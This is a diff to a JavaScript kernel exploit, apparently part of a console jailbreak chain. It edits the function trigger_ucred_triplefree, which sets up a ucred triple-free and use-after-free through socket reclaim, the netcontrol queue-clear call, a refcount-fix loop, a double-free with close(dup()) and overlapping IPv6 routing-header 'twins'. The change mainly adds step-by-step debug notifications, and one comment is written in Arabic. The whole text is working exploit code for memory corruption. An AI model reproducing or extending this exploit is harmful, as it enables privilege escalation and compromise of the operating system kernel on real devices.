@@ -1486,9 +1486,10 @@ function trigger_ucred_triplefree() {
     // 2) allocate new ucred
     setuid(1);
 
-    send_notification("[T] before reclaim_uaf_socket");
+    send_notification("[T] before reclaim_uaf");
     // 3) reclaim fd → uaf_socket
     var tmp_sock = socket(AF_UNIX, SOCK_STREAM, 0);
+    send_notification("[T] after_reclaim_uaf");
     if (tmp_sock.eq(BigInt_Error)) {
       log("[TRIGGER] uaf_socket error, retry");
       continue;
@@ -1496,32 +1497,41 @@ function trigger_ucred_triplefree() {
     uaf_socket = Number(tmp_sock.and(0xFFFFFFFF));
 
     // 4) free previous ucred
+    send_notification("[T] before_free_prev_ucred");
     setuid(1);
+    send_notification("[T] after_free_prev_ucred");
+
 
     // 5) unregister → free file + ucred
+    send_notification("[T] before_clear_queue");
     write32(nc_clear_buf, uaf_socket);
     nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
-    
-    send_notification("[T] before step 6");
+    send_notification("[T] after_clear_queue");
+
+
     // 6) refcount fix loop
+    send_notification("[T] before_refcount_fix");
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
-      trigger_iov_recvmsg();
-      write(new BigInt(iov_sock_1), tmp, 1);
-      wait_iov_recvmsg();
-      read(new BigInt(iov_sock_0), tmp, 1);
+        trigger_iov_recvmsg();
+        write(new BigInt(iov_sock_1), tmp, 1);
+        wait_iov_recvmsg();
+        read(new BigInt(iov_sock_0), tmp, 1);
     }
+    send_notification("[T] after_refcount_fix");
+
     log("[TRIGGER] step 6 done");
 
     // 7) first double-free
-    log("[TRIGGER] step 7: first double-free via dup(uaf_socket)");
+    send_notification("[T] before_double_free");
     close(dup(new BigInt(uaf_socket)));
-    log("[TRIGGER] step 7 done");
+    send_notification("[T] after_double_free");
 
-    send_notification("[T] before find_twins");
+
     // 8) find twins
-    log("[TRIGGER] step 8: find_twins()");
+    send_notification("[T] before_find_twins");
     end = find_twins();
-    log("[TRIGGER] step 8: find_twins() result end=" + end);
+    send_notification("[T] after_find_twins");
+
 
     if (!end) {
       log("[TRIGGER] step 8: no twins, cleanup & retry");
@@ -1532,15 +1542,18 @@ function trigger_ucred_triplefree() {
     }
 
     log("[TRIGGER] step 8: twins found twins[0]=" + twins[0] + " twins[1]=" + twins[1]);
-
+    
+    
     // 9) free one twin
+    send_notification("[T] before _free_rthdr");
     free_rthdr(ipv6_socks[twins[1]]);
-
+    
     // 🔍 refcount بعد free التوأم (ده المكان الصح)
     write32(leak_rthdr.add(0x04), 0);
     get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 0x20);
     var mid_ref = read32(leak_rthdr);
     log("[TRIGGER] mid-refcount (after free twin[1])=" + mid_ref);
+    send_notification("[T] after_free_rthdr");
 
     // 10) wait refcount == 1
     var count = 0;
